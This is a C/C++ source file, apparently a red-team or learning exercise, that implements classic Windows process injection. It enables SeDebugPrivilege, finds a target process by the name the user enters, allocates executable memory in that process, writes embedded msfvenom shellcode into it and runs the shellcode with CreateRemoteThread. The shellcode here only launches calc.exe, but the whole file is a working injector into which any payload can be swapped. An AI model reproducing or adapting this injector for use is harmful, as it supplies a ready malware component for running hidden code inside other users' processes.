#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <tlhelp32.h>
#include <tchar.h>
#include <iostream>

//msfvenom -p windows/x64/exec CMD=calc.exe EXITFUNC=thread -a x64
//calc payload
//msfvenom -p windows/x64/exec CMD=calc.exe -f hex
unsigned char payload[] = 
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
"\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";


unsigned int payload_len = sizeof(payload);


bool EnableDebugPrivilege() {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        std::cerr << "OpenProcessToken failed. Error: " << GetLastError() << "\n";
        return false;
    }
    //printf("\nYes");
    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
        std::cerr << "LookupPrivilegeValue failed. Error: " << GetLastError() << "\n";
        CloseHandle(hToken);
        return false;
    }
    //printf("\nYes1");
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL)) {
        std::cerr << "AdjustTokenPrivileges failed. Error: " << GetLastError() << "\n";
        CloseHandle(hToken);
        return false;
    }
    //printf("\nYes2");
    CloseHandle(hToken);
    //printf("\nYes3");
    printf("\nError: %lu\n", GetLastError());
    
    return GetLastError() == ERROR_SUCCESS;
}

int FindTarget(const char *procname) {

        HANDLE hProcSnap;
        PROCESSENTRY32 pe32;
        int pid = 0;
                
        hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (INVALID_HANDLE_VALUE == hProcSnap) 
        return 0;
                
        pe32.dwSize = sizeof(PROCESSENTRY32); 
                
        if (!Process32First(hProcSnap, &pe32)) {
                CloseHandle(hProcSnap);
                return 0;
        }
                
        while (Process32Next(hProcSnap, &pe32)) {
                if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
                        pid = pe32.th32ProcessID;
                        break;
                }
        }
                
        CloseHandle(hProcSnap);
                
        return pid;
}


int Inject(HANDLE hProc, unsigned char * payload, unsigned int payload_len)
 {

        LPVOID pRemoteCode = NULL;
        HANDLE hThread = NULL;

        pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        if(pRemoteCode)
        {
            printf("\nVirtualAllocEx Success\n");
        }
        else
        {
            printf("\nVirtualAllocEx failed\n");
        }
        WriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T *)NULL);
        
        hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteCode, NULL, 0, NULL);
        if (hThread != NULL) {
                printf("\nCreateRemoteThread/Process Injection Success");
                printf("Thread ID=%d", hThread);
                WaitForSingleObject(hThread, 500);
                CloseHandle(hThread);
                printf("\nCreateRemoteThread/Process Injection Success");
                return 0;
        }
        
        printf("\nCreateRemoteThread Failed");

        return -1;
}


int main(void) {

	int pid = 0;
    HANDLE hProc = NULL;

    char processName[260];  // Windows MAX_PATH is 260

    printf("Enter process name (e.g., notepad.exe): ");
    scanf("%259s", processName);  // safe to prevent buffer overflow

    pid = FindTarget(processName);
    printf("Target PID is = %d", pid);
    
	if (pid) {
		
        if (!EnableDebugPrivilege()) {
            std::cerr << "\nFailed to enable SeDebugPrivilege.\n";
            return 1;
        }
		// Open the target process
		hProc = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
				     PROCESS_VM_OPERATION  | PROCESS_VM_READ | PROCESS_VM_WRITE,
				     FALSE, (DWORD) pid);

		if (hProc != NULL) {
            printf("\nCall to Inject Code");
			Inject(hProc, payload, payload_len);
			CloseHandle(hProc);
		}
        else{
            printf("\nOpenprocess Failed.");
            printf("\nError: %lu\n", GetLastError());
        }
	}
    else
    {
        printf("\nTarget process is not found\n");
    }
        return 0;
}